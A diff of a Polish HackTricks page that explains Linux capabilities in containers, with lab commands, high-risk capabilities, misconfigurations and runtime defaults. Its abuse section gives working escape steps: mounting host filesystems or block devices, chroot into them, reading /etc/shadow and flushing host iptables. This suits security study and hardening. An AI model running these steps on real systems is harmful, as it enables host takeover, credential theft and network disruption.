@@ -1,14 +1,14 @@
-# Uprawnienia (capabilities) w kontenerach Linux
+# Uprawnienia Linuksa w kontenerach
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
 ## Przegląd
 
-Uprawnienia (Linux capabilities) są jednym z najważniejszych elementów bezpieczeństwa kontenerów, ponieważ odpowiadają na subtelne, lecz fundamentalne pytanie: **co tak naprawdę oznacza „root” wewnątrz kontenera?** Na zwykłym systemie Linux UID 0 historycznie oznaczał bardzo szeroki zestaw uprawnień. W nowoczesnych jądrach ten przywilej został rozbity na mniejsze jednostki zwane capabilities. Proces może działać jako root i jednocześnie nie mieć wielu potężnych możliwości, jeśli odpowiednie capabilities zostały usunięte.
+Linux capabilities są jednym z najważniejszych elementów bezpieczeństwa kontenerów, ponieważ odpowiadają na subtelne, lecz fundamentalne pytanie: **co tak naprawdę oznacza "root" wewnątrz kontenera?** Na zwykłym systemie Linux UID 0 historycznie oznaczał bardzo szeroki zestaw uprawnień. W nowoczesnych jądrach ten przywilej jest rozłożony na mniejsze jednostki zwane capabilities. Proces może działać jako root i nadal nie mieć wielu potężnych operacji, jeśli odpowiednie capabilities zostały usunięte.
 
-Kontenery w dużym stopniu opierają się na tym rozróżnieniu. Wiele workloadów nadal uruchamia się jako UID 0 wewnątrz kontenera ze względów kompatybilności lub prostoty. Bez usuwania capabilities byłoby to zdecydowanie zbyt niebezpieczne. Po usunięciu części capabilities proces root w kontenerze nadal może wykonywać wiele zwykłych zadań wewnątrz kontenera, jednocześnie mając odmówiony dostęp do bardziej wrażliwych operacji jądra. Dlatego powłoka kontenera pokazująca `uid=0(root)` nie oznacza automatycznie „host root” ani nawet „szerokich uprawnień w jądrze”. Zestawy capabilities decydują, ile takiej tożsamości root rzeczywiście warte.
+Kontenery w dużej mierze opierają się na tym rozróżnieniu. Wiele zadań uruchamianych jest nadal jako UID 0 wewnątrz kontenera ze względów kompatybilności lub prostoty. Bez usuwania capabilities byłoby to zbyt niebezpieczne. Dzięki ich usuwaniu proces root w kontenerze może wykonywać wiele zwykłych zadań wewnątrz kontenera, jednocześnie mając zabroniony dostęp do bardziej wrażliwych operacji jądra. Dlatego powłoka kontenera pokazująca `uid=0(root)` nie oznacza automatycznie "roota hosta" ani nawet "szerokich uprawnień jądra". Zestawy capabilities decydują, ile ta tożsamość root rzeczywiście jest warta.
 
-Dla pełnego odwołania do Linux capabilities i wielu przykładów nadużyć, zobacz:
+Dla pełnego odniesienia dotyczącego Linux capabilities i wielu przykładów nadużyć zobacz:
 
 {{#ref}}
 ../../linux-capabilities.md
@@ -16,21 +16,21 @@ Dla pełnego odwołania do Linux capabilities i wielu przykładów nadużyć, zo
 
 ## Działanie
 
-Capabilities są śledzone w kilku zestawach, w tym permitted, effective, inheritable, ambient i bounding. W wielu ocenach kontenerów dokładna semantyka jądra każdego z tych zestawów ma mniejsze znaczenie niż praktyczne pytanie: **jakie uprzywilejowane operacje ten proces może teraz skutecznie wykonać, a jakie przyszłe uzyskiwanie uprawnień jest nadal możliwe?**
+Capabilities są śledzone w kilku zestawach, w tym permitted, effective, inheritable, ambient i bounding. Dla wielu ocen bezpieczeństwa kontenerów dokładne semantyki jądra dla każdego zestawu są mniej pilne niż praktyczne pytanie końcowe: **jakie uprzywilejowane operacje ten proces może teraz pomyślnie wykonać i jakie przyszłe uzyskania uprawnień są nadal możliwe?**
 
-To ma znaczenie, ponieważ wiele technik ucieczki z kontenera to w rzeczywistości problemy z capabilities ukryte jako problemy kontenerowe. Workload z `CAP_SYS_ADMIN` może uzyskać dostęp do ogromnej części funkcjonalności jądra, której normalny proces root w kontenerze nie powinien dotykać. Workload z `CAP_NET_ADMIN` staje się znacznie bardziej niebezpieczny, jeśli współdzieli również namespace sieciowy hosta. Workload z `CAP_SYS_PTRACE` robi się ciekawszy, jeśli może zobaczyć procesy hosta przez współdzielenie PID hosta. W Docker lub Podman może to wyglądać jak `--pid=host`; w Kubernetes zwykle pojawia się jako `hostPID: true`.
+Powód, dla którego to ma znaczenie, jest taki, że wiele technik ucieczki z kontenera to tak naprawdę problemy z capabilities przebrane za problemy kontenerowe. Obciążenie z `CAP_SYS_ADMIN` uzyskuje dostęp do ogromnej funkcjonalności jądra, której normalny proces root w kontenerze nie powinien dotykać. Obciążenie z `CAP_NET_ADMIN` staje się znacznie bardziej niebezpieczne, jeśli dodatkowo współdzieli namespace sieciowy hosta. Obciążenie z `CAP_SYS_PTRACE` staje się dużo bardziej interesujące, jeśli może zobaczyć procesy hosta przez współdzielenie PID hosta. W Dockerze lub Podman może to wyglądać jak `--pid=host`; w Kubernetes zwykle pojawia się jako `hostPID: true`.
 
-Innymi słowy, zestawu capabilities nie można oceniać w izolacji. Należy go czytać łącznie z namespaces, seccomp i polityką MAC.
+Innymi słowy, zestaw capabilities nie może być oceniany w izolacji. Trzeba go czytać razem z namespaces, seccomp i polityką MAC.
 
 ## Laboratorium
 
-Bardzo prosty sposób na sprawdzenie capabilities wewnątrz kontenera to:
+Bardzo bezpośredni sposób na sprawdzenie capabilities wewnątrz kontenera to:
 ```bash
 docker run --rm -it debian:stable-slim bash
 apt-get update && apt-get install -y libcap2-bin
 capsh --print
 ```
-Możesz również porównać bardziej restrykcyjny container z takim, któremu dodano wszystkie capabilities:
+Możesz także porównać bardziej restrykcyjny kontener z takim, któremu dodano wszystkie capabilities:
 ```bash
 docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
@@ -39,64 +39,64 @@ Aby zobaczyć efekt wąskiego dodatku, spróbuj usunąć wszystko i dodać z pow
 ```bash
 docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
 ```
-Te drobne eksperymenty pokazują, że runtime nie po prostu przełącza wartość boolowską nazwaną "privileged". Kształtuje rzeczywistą powierzchnię uprawnień dostępną dla procesu.
+Te małe eksperymenty pomagają pokazać, że runtime nie polega jedynie na przełączaniu wartości boolean o nazwie "privileged". Kształtuje on rzeczywistą powierzchnię uprawnień dostępną dla procesu.
 
-## Uprawnienia wysokiego ryzyka
+## Uprawnienia o wysokim ryzyku
 
-Chociaż wiele capabilities może mieć znaczenie w zależności od celu, kilka z nich pojawia się wielokrotnie w analizach escape'ów z kontenera.
+Chociaż wiele capabilities może mieć znaczenie w zależności od celu, kilka z nich pojawia się wielokrotnie w analizie ucieczek z kontenera.
 
-**`CAP_SYS_ADMIN`** to to, czego obrońcy powinni podejrzewać najbardziej. Często opisywany jest jako "the new root", ponieważ odblokowuje ogromną ilość funkcjonalności, w tym operacje związane z mount, zachowania zależne od namespace oraz wiele ścieżek jądra, które nigdy nie powinny być przypadkowo wystawione na kontenery. Jeśli kontener ma `CAP_SYS_ADMIN`, słabe seccomp i brak silnego ograniczenia MAC, wiele klasycznych ścieżek breakout staje się znacznie bardziej realistycznych.
+**`CAP_SYS_ADMIN`** to ten, któremu obrońcy powinni przyglądać się z największą podejrzliwością. Często opisywany jest jako „nowy root”, ponieważ odblokowuje ogromną ilość funkcjonalności, w tym operacje związane z mountami, zachowania zależne od przestrzeni nazw oraz wiele ścieżek w jądrze, które nigdy nie powinny być swobodnie udostępniane kontenerom. Jeśli kontener ma `CAP_SYS_ADMIN`, słaby seccomp i brak silnego ograniczenia MAC, wiele klasycznych ścieżek ucieczki staje się znacznie bardziej realistycznych.
 
-**`CAP_SYS_PTRACE`** ma znaczenie, gdy istnieje widoczność procesów, szczególnie jeśli PID namespace jest współdzielony z hostem lub z interesującymi sąsiednimi obciążeniami. Może przekształcić widoczność w manipulację.
+**`CAP_SYS_PTRACE`** ma znaczenie, gdy istnieje widoczność procesów, szczególnie jeśli namespace PID jest współdzielony z hostem lub z interesującymi sąsiednimi obciążeniami. Może to zamienić widoczność w możliwość manipulacji.
 
-**`CAP_NET_ADMIN`** i **`CAP_NET_RAW`** mają znaczenie w środowiskach zorientowanych na sieć. Na izolowanej sieci typu bridge mogą już być ryzykowne; w przypadku współdzielonego namespace sieci hosta są znacznie gorsze, ponieważ obciążenie może być w stanie rekonfigurować sieć hosta, sniffować, spoofować lub zakłócać lokalne przepływy ruchu.
+**`CAP_NET_ADMIN`** i **`CAP_NET_RAW`** są istotne w środowiskach skoncentrowanych na sieci. W izolowanej sieci typu bridge mogą już stanowić ryzyko; na współdzielonej przestrzeni nazw sieci hosta są znacznie groźniejsze, ponieważ obciążenie może być w stanie rekonfigurować sieć hosta, podsłuchiwać, podszywać się lub zakłócać lokalne przepływy ruchu.
 
-**`CAP_SYS_MODULE`** zwykle jest katastrofalny w środowisku z uprawnieniami root, ponieważ ładowanie modułów jądra to w praktyce kontrola nad jądrem hosta. Powinien niemal nigdy nie pojawiać się w ogólnym obciążeniu kontenera.
+**`CAP_SYS_MODULE`** zwykle jest katastrofalne w środowisku z rootem, ponieważ ładowanie modułów jądra to w praktyce kontrola nad jądrem hosta. Powinno niemal nigdy nie pojawiać się w ogólnym obciążeniu kontenera.
 
-## Użycie w runtime
+## Użycie runtime
 
-Docker, Podman, stosy oparte na containerd i CRI-O wszystkie używają kontroli capabilities, ale domyślne ustawienia i interfejsy zarządzania różnią się. Docker udostępnia je bardzo bezpośrednio przez flagi takie jak `--cap-drop` i `--cap-add`. Podman udostępnia podobne kontrolki i często korzysta z wykonywania bez uprawnień root jako dodatkowej warstwy bezpieczeństwa. Kubernetes eksponuje dodawania i usuwania capabilities przez Pod lub container `securityContext`. Środowiska system-container takie jak LXC/Incus również polegają na kontroli capabilities, ale szersza integracja z hostem w tych systemach często skłania operatorów do luźniejszego poluzowania domyślnych ustawień niż w środowisku app-container.
+Docker, Podman, stosy oparte na containerd i CRI-O wszystkie używają kontroli capabilities, ale domyślne ustawienia i interfejsy zarządzania różnią się. Docker udostępnia je bardzo bezpośrednio przez flagi takie jak `--cap-drop` i `--cap-add`. Podman udostępnia podobne kontrolki i często zyskuje na uruchomieniu rootless jako dodatkowej warstwie bezpieczeństwa. Kubernetes ujawnia dodawanie i usuwanie capabilities przez `securityContext` Poda lub kontenera. Środowiska system-container, takie jak LXC/Incus, także opierają się na kontroli capabilities, ale szersza integracja z hostem w tych systemach często kusi operatorów do bardziej agresywnego rozluźniania domyślnych ustawień niż w środowisku app-container.
 
-Ta sama zasada obowiązuje we wszystkich z nich: capability, które technicznie można nadać, niekoniecznie powinno być nadane. Wiele rzeczywistych incydentów zaczyna się, gdy operator dodaje capability tylko dlatego, że workload nie działał pod bardziej restrykcyjną konfiguracją i zespół potrzebował szybkiego obejścia.
+Ta sama zasada obowiązuje we wszystkich: capability, które technicznie można przyznać, niekoniecznie powinno być przyznane. Wiele rzeczywistych incydentów zaczyna się, gdy operator dodaje capability tylko dlatego, że obciążenie nie działało przy ostrzejszej konfiguracji i zespół potrzebował szybkiego rozwiązania.
 
 ## Błędne konfiguracje
 
-Najbardziej oczywisty błąd to **`--cap-add=ALL`** w narzędziach CLI typu Docker/Podman, ale to nie jedyny. W praktyce częstszym problemem jest nadanie jednej lub dwóch wyjątkowo potężnych capabilities, szczególnie `CAP_SYS_ADMIN`, aby "sprawić, by aplikacja działała", bez zrozumienia implikacji związanych z namespace, seccomp i mount. Innym częstym trybem awarii jest łączenie dodatkowych capabilities ze współdzieleniem namespace hosta. W Dockerze lub Podman może to wyglądać jak `--pid=host`, `--network=host` lub `--userns=host`; w Kubernetes równoważna ekspozycja zwykle pojawia się przez ustawienia workloadu takie jak `hostPID: true` lub `hostNetwork: true`. Każde z tych połączeń zmienia to, co capability faktycznie może wpływać.
+Najbardziej oczywistym błędem jest **`--cap-add=ALL`** w CLI w stylu Docker/Podman, ale to nie jedyna pomyłka. W praktyce częściej problemem jest przyznanie jednej lub dwóch ekstremalnie potężnych capabilities, zwłaszcza `CAP_SYS_ADMIN`, aby „sprawić, by aplikacja działała”, bez zrozumienia implikacji związanych z namespace, seccomp i mountami. Innym częstym trybem błędu jest łączenie dodatkowych capabilities ze współdzieleniem namespace hosta. W Dockerze lub Podmanie może to pojawić się jako `--pid=host`, `--network=host` lub `--userns=host`; w Kubernetes równoważna ekspozycja zwykle pojawia się przez ustawienia obciążenia takie jak `hostPID: true` lub `hostNetwork: true`. Każde z tych połączeń zmienia to, na co capability faktycznie wpływa.
 
-Często też administratorzy wierzą, że ponieważ workload nie jest w pełni `--privileged`, nadal jest znacząco ograniczony. Czasem to prawda, ale czasem efektywna postawa jest już wystarczająco bliska uprawnieniom root, że rozróżnienie przestaje mieć znaczenie operacyjne.
+Często też administratorzy sądzą, że ponieważ obciążenie nie jest w pełni `--privileged`, to nadal jest znacząco ograniczone. Czasami to prawda, ale czasami faktyczna postawa jest już na tyle zbliżona do privileged, że rozróżnienie przestaje mieć znaczenie operacyjne.
 
-## Nadużycia
+## Wykorzystanie
 
-Pierwszym praktycznym krokiem jest wyenumerowanie efektywnego zestawu capabilities i natychmiastowe przetestowanie działań specyficznych dla danej capability, które miałyby znaczenie dla escape'a lub dostępu do informacji hosta:
+Pierwszym praktycznym krokiem jest wyenumerowanie efektywnego zestawu capabilities i natychmiastowe przetestowanie akcji specyficznych dla poszczególnych capabilities, które miałyby znaczenie dla ucieczki lub dostępu do informacji o hoście:
 ```bash
 capsh --print
 grep '^Cap' /proc/self/status
 ```
-Jeśli `CAP_SYS_ADMIN` jest obecny, najpierw przetestuj mount-based abuse i host filesystem access, ponieważ to jeden z najczęstszych breakout enablers:
+Jeśli `CAP_SYS_ADMIN` jest obecny, przetestuj najpierw mount-based abuse i host filesystem access, ponieważ to jeden z najczęstszych breakout enablers:
 ```bash
 mkdir -p /tmp/m
 mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
 mount | head
 find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
 ```
-Jeśli `CAP_SYS_PTRACE` jest obecny i kontener widzi interesujące procesy, sprawdź, czy tę capability można wykorzystać do inspekcji procesów:
+Jeśli `CAP_SYS_PTRACE` jest obecne i kontener może zobaczyć interesujące procesy, sprawdź, czy to uprawnienie można wykorzystać do inspekcji procesów:
 ```bash
 capsh --print | grep cap_sys_ptrace
 ps -ef | head
 for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
 ```
-Jeśli `CAP_NET_ADMIN` lub `CAP_NET_RAW` jest obecny, sprawdź, czy workload może manipulować widocznym stosem sieciowym lub przynajmniej zebrać przydatne informacje o sieci:
+Jeśli `CAP_NET_ADMIN` lub `CAP_NET_RAW` jest obecny, sprawdź, czy workload może manipulować widocznym stosem sieciowym lub przynajmniej pozyskać przydatne informacje o sieci:
 ```bash
 capsh --print | grep -E 'cap_net_admin|cap_net_raw'
 ip addr
 ip route
 iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ```
-Gdy test capability się powiedzie, połącz go z kontekstem namespace. Capability wyglądające na jedynie ryzykowne w izolowanym namespace może natychmiast stać się escape lub host-recon primitive, gdy kontener dodatkowo współdzieli host PID, host network lub host mounts.
+Gdy test capability powiedzie się, zestaw go z sytuacją namespace. Capability, które w izolowanym namespace wygląda jedynie na ryzykowne, może natychmiast stać się prymitywem escape lub host-recon, gdy kontener jednocześnie współdzieli host PID, host network lub host mounts.
 
 ### Pełny przykład: `CAP_SYS_ADMIN` + Host Mount = Host Escape
 
-Jeśli kontener ma `CAP_SYS_ADMIN` i zapisywalny bind mount systemu plików hosta, taki jak `/host`, ścieżka escape jest często prosta:
+Jeśli kontener ma `CAP_SYS_ADMIN` i zapisywalny bind mount systemu plików hosta taki jak `/host`, ścieżka ucieczki jest często prosta:
 ```bash
 capsh --print | grep cap_sys_admin
 mount | grep ' /host '
@@ -109,14 +109,14 @@ id
 hostname
 cat /etc/shadow | head
 ```
-Jeśli `chroot` jest niedostępny, ten sam efekt można często osiągnąć, uruchamiając plik binarny przez zamontowane drzewo:
+Jeśli `chroot` jest niedostępny, ten sam efekt często można uzyskać, uruchamiając binarkę przez zamontowane drzewo:
 ```bash
 /host/bin/bash -p
 export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
 ```
 ### Pełny przykład: `CAP_SYS_ADMIN` + dostęp do urządzenia
 
-Jeśli urządzenie blokowe z hosta zostanie wystawione, `CAP_SYS_ADMIN` może przekształcić je w bezpośredni dostęp do systemu plików hosta:
+Jeśli urządzenie blokowe z hosta zostanie udostępnione, `CAP_SYS_ADMIN` może zamienić je w bezpośredni dostęp do systemu plików hosta:
 ```bash
 ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
 mkdir -p /mnt/hostdisk
@@ -124,9 +124,9 @@ mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/de
 ls -la /mnt/hostdisk
 chroot /mnt/hostdisk /bin/bash 2>/dev/null
 ```
-### Pełny przykład: `CAP_NET_ADMIN` + Host Networking
+### Pełny przykład: `CAP_NET_ADMIN` + Sieć hosta
 
-Ta kombinacja nie zawsze daje bezpośrednio host root, ale może w pełni przekonfigurować host network stack:
+To połączenie nie zawsze daje bezpośredni root na hoście, ale może w pełni przekonfigurować stos sieciowy hosta:
 ```bash
 capsh --print | grep cap_net_admin
 ip addr
@@ -135,30 +135,31 @@ iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ip link set lo down 2>/dev/null
 iptables -F 2>/dev/null
 ```
-To może umożliwić denial of service, traffic interception lub dostęp do usług, które wcześniej były filtrowane.
+To może umożliwić denial of service, przechwytywanie ruchu lub dostęp do usług, które wcześniej były filtrowane.
 
 ## Sprawdzenia
 
-Celem sprawdzeń capabilities nie jest jedynie wypisanie surowych wartości, lecz zrozumienie, czy proces ma wystarczające uprawnienia, aby jego bieżąca przestrzeń nazw i konfiguracja mountów stały się niebezpieczne.
+Celem sprawdzeń capability nie jest jedynie zrzucenie surowych wartości, lecz zrozumienie, czy proces ma wystarczające uprawnienia, aby jego aktualna przestrzeń nazw i stan punktów montowania stały się niebezpieczne.
 ```bash
 capsh --print                    # Human-readable capability sets and securebits
 grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
 ```
-Co warto tutaj zauważyć:
+Co jest tutaj interesujące:
 
-- `capsh --print` jest najprostszym sposobem na wykrycie wysokiego ryzyka capabilities, takich jak `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, lub `cap_sys_module`.
-- Linia `CapEff` w `/proc/self/status` pokazuje, co jest faktycznie aktywne teraz, a nie tylko to, co może być dostępne w innych zbiorach.
-- Zrzut capabilities staje się znacznie ważniejszy, jeśli kontener współdzieli z hostem przestrzeń nazw PID, sieciową lub użytkownika, albo ma zapisywalne mounty hosta.
+- `capsh --print` to najprostszy sposób na wykrycie capabilities o wysokim ryzyku, takich jak `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` lub `cap_sys_module`.
+- Linia `CapEff` w `/proc/self/status` mówi, co jest aktualnie skuteczne, nie tylko co może być dostępne w innych zbiorach.
+- Zrzut informacji o capabilities staje się znacznie ważniejszy, jeśli kontener dzieli także host PID, network, lub user namespaces, albo ma zapisywalne host mounts.
 
-Po zebraniu surowych informacji o capabilities, następnym krokiem jest ich interpretacja. Zadaj pytania: czy proces jest root, czy user namespaces są aktywne, czy przestrzenie nazw hosta są współdzielone, czy seccomp jest wymuszony, oraz czy AppArmor lub SELinux nadal ograniczają proces. Sam zestaw capabilities to tylko część historii, ale często to on wyjaśnia, dlaczego jedno wydostanie się z kontenera działa, a inne nie przy tym samym pozornym punkcie wyjścia.
+Po zebraniu surowych informacji o capabilities, następnym krokiem jest ich interpretacja. Zadaj pytania: czy proces jest root, czy user namespaces są aktywne, czy host namespaces są współdzielone, czy seccomp wymusza ograniczenia, i czy AppArmor lub SELinux nadal ograniczają proces. Sam zestaw capabilities to tylko część historii, ale często to ona wyjaśnia, dlaczego jeden container breakout działa, a inny kończy się niepowodzeniem przy tym samym pozornym punkcie startowym.
 
 ## Domyślne ustawienia runtime
 
-| Runtime / platforma | Domyślny stan | Domyślne zachowanie | Typowe ręczne osłabienia |
+| Runtime / platform | Default state | Default behavior | Common manual weakening |
 | --- | --- | --- | --- |
 | Docker Engine | Domyślnie zredukowany zestaw capabilities | Docker utrzymuje domyślną listę dozwolonych capabilities i usuwa pozostałe | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
 | Podman | Domyślnie zredukowany zestaw capabilities | Kontenery Podman są domyślnie nieuprzywilejowane i używają zredukowanego modelu capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
-| Kubernetes | Dziedziczy domyślne ustawienia runtime, chyba że zmienione | Jeśli nie określono `securityContext.capabilities`, kontener otrzymuje domyślny zestaw capabilities z runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
-| containerd / CRI-O under Kubernetes | Zazwyczaj domyślne ustawienia runtime | Rzeczywisty zestaw zależy od runtime oraz specyfikacji Pod | to samo co w wierszu Kubernetes; bezpośrednia konfiguracja OCI/CRI może również jawnie dodać capabilities |
+| Kubernetes | Dziedziczy domyślne ustawienia runtime, chyba że zmieniono | Jeśli nie określono `securityContext.capabilities`, kontener otrzymuje domyślny zestaw capabilities z runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
+| containerd / CRI-O under Kubernetes | Zazwyczaj domyślne dla runtime | Skuteczny zestaw zależy od runtime i specyfikacji Pod | tak samo jak w wierszu Kubernetes; bezpośrednia konfiguracja OCI/CRI może też jawnie dodać capabilities |
 
-Dla Kubernetes istotne jest, że API nie definiuje jednego uniwersalnego domyślnego zestawu capabilities. Jeśli Pod nie dodaje ani nie usuwa capabilities, obciążenie dziedziczy domyślne ustawienia runtime dla tego węzła.
+Dla Kubernetes ważne jest, że API nie definiuje jednego uniwersalnego domyślnego zestawu capabilities. Jeśli Pod nie dodaje ani nie usuwa capabilities, workload dziedziczy domyślny zestaw runtime dla tego węzła.
+{{#include ../../../../banners/hacktricks-training.md}}
